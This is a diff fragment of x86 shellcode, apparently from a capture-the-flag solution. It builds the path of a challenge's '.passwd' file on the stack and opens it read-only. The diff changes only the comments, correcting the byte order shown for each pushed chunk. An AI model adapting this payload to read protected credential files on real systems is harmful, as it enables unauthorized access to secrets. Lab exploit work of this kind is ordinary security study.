@@ -61,14 +61,14 @@ push 0x647773AA
 pop ebx
 shr ebx, 0x8
 push ebx
-push 0x7361702e ; sap.
-push 0x2f323368 ; /23h
-push 0x632f656d ; c/em
-push 0x65747379 ; etsy
-push 0x732d7070 ; s-pp
-push 0x612f6567 ; a/eg
-push 0x6e656c6c ; nell
-push 0x6168632f ; ahc/
+push 0x7361702e ; .pas
+push 0x2f323368 ; h32/
+push 0x632f656d ; me/c
+push 0x65747379 ; yste
+push 0x732d7070 ; pp-s
+push 0x612f6567 ; ge/a
+push 0x6e656c6c ; llen
+push 0x6168632f ; /cha
 
 mov ebx, esp
 xor ecx, ecx ; O_RDONLY
